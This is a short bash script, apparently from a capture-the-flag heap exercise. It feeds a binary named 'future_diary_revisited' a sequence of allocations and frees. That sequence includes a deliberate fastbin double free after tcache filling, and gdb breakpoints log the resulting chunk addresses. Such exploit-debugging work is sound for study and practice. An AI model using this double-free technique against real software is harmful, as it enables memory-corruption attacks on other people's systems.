#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/extracted"

python3 - <<'PY'
from pathlib import Path

p = b""

def create(i, n=0x78, data=None):
    global p
    if data is None:
        data = bytes([0x40 + (i % 50)]) * n
    p += b"1\n%d\n%d\n" % (i, n) + data + b"\n"

def delete(i):
    global p
    p += b"2\n%d\n" % i

for i in range(1, 10):
    create(i)
for i in range(1, 8):
    delete(i)
delete(8)
delete(9)
delete(8)
for i in range(10, 17):
    create(i)
for i in range(17, 22):
    create(i, data=b"X" * 0x78)
p += b"4\n"

Path("/tmp/fdr_fastbin_inp").write_bytes(p)
PY

cat >/tmp/fdr_fastbin.gdb <<'GDB'
set pagination off
set confirm off
set disable-randomization off
b *create+0x11d
commands
silent
printf "calloc page=%d ptr=%p\n", *(int*)($rbp-0x18), *(void**)($rbp-0x10)
continue
end
b *delete+0xc3
commands
silent
set $idx=*(int*)($rbp-0xc)
set $p=*(void**)((char*)&page + $idx*16)
printf "freed page=%d ptr=%p\n", $idx, $p
continue
end
run < /tmp/fdr_fastbin_inp
GDB

gdb -q ./future_diary_revisited -x /tmp/fdr_fastbin.gdb
